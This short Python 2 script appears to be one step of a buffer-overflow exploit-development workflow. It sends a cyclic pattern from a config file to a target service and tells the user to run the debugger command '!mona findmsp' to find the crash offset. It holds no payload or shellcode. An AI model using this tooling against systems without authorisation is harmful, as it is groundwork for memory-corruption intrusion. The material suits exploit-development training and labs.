#!/usr/bin/env python2
import socket
from config import *

print ""
print "Using mona,"
print "-------------"
print "!mona findmsp"
print "-------------"
print ""

buf = PATTERN[0:BUFT]

connect(buf)
